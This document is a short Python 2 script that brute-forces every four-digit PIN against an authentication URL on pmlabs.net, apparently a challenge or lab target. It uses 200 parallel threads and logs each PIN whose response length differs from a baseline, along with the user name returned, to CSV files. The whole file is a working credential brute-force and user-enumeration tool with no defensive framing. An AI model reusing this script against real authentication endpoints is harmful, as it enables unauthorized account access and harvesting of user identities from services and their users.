import requests
import csv
import thread

def enum_users(start,stop):
    sUsers = []
    sAllPins = ["%04d" %x for x in range(start,stop)]
    fileName="users"+str(start)+"-"+str(stop)+".csv"

    with open(fileName, 'wb') as fUsers:
        lFields = ['PIN','User']
        csvUsers = csv.DictWriter(fUsers, fieldnames = lFields)
        csvUsers.writeheader()
        for i in sAllPins:
            try:
                rResponse = requests.get('https://pmlabs.net/pwr/0xfeedface/0x02/.auth/?pin=%s'%i).text
            except:
                rResponse = "        requests exception"
            if len(rResponse) != 159:
                csvUsers.writerow({'PIN' : i, 'User' : rResponse[8:]})
                print "PIN:%s User: %s"%(i,rResponse[8:])


for i in range(200):
    try:
        thread.start_new_thread( enum_users, (i*50,i*50+50 , ) )
    except:
        print "Error: unable to start thread"

while 1:
   pass
